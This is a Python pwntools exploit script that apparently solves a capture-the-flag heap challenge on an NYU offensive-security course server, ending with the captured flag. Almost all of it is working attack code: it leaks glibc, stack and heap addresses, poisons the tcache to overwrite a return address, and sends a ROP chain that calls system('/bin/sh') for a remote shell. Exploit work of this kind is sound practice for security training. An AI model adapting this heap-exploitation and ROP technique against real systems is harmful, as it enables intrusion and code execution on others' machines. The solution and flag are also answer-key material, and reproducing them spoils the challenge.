from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./useful_and_fun_message_server_v2.0"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1221
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+383)
#     b *(main+395)
#     b *(main+407)
#     b *(main+419)
#     continue
# ''')

def add_message(message):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    pprint(p.recvuntil(b"> ").decode())
    p.send(message)
    log.info(f"Adding a message: {message}")

def review_message(index):
    print(p.recvuntil(b"> ").decode())
    p.send(b"2")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    print(p.recvuntil(b"Your message is ").decode())
    message = p.recvline().strip()
    log.info(f"Reviewing the message: {message} at index: {index}")
    return message

def edit_message(index, message):
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    print(p.recvuntil(b"> ").decode())
    p.send(message)
    log.info(f"Editing the message at index: {index} with a new message: {message}")

def send_messages():
    print(p.recvuntil(b"> ").decode())
    p.send(b"4")
    log.info(f"Sending all messages")

# Stage 1: Leak glibc printf address and calculate required glibc addresses
print(p.recvuntil(b"a helpful message: ").decode())
glibc_printf_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Receiving glibc printf address: {hex(glibc_printf_addr)}")
e = ELF("libc.so.6")
glibc_base_addr = glibc_printf_addr - e.symbols.printf
glibc_system_addr = glibc_base_addr + e.symbols.system
glibc_binsh_addr = glibc_base_addr + next(e.search(b"/bin/sh"))

# Stage 2: Leak stack address in environ and calculate return address of add
print(p.recvuntil(b"another helpful message: ").decode())
stack_addr_in_environ = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Receiving stack address in environ: {hex(stack_addr_in_environ)}")
add_return_addr = stack_addr_in_environ - 0x150

# Stage 3: Prepare for tcache poisoning
add_message(b"A"*0x8)
add_message(b"B"*0x8)
send_messages()

# Stage 4: Leak heap base address
heap_base_addr = ((u64(review_message(0).ljust(8, b"\x00")) << 12) ^ 0) & ~0xfff
log.info(f"Leaking heap base address: {hex(heap_base_addr)}")

# Stage 5: Perform tcache poisoning
edit_message(1, p64(((heap_base_addr + 0x2f0) >> 12) ^ (add_return_addr - 0x8)))
add_message(b"C"*0x8)

# Stage 6: Form and deploy ROP chain by calling add
r = ROP("libc.so.6")
chain = [
    r.rdi.address + glibc_base_addr,
    glibc_binsh_addr,
    r.ret.address + glibc_base_addr,
    glibc_system_addr
]
add_message(b"D"*0x8 + b"".join([p64(addr) for addr in chain]))

p.interactive()

# flag{Unw4v3r1ng_AND_fl0ur1shinG_!_178ab5634ef45e3b}
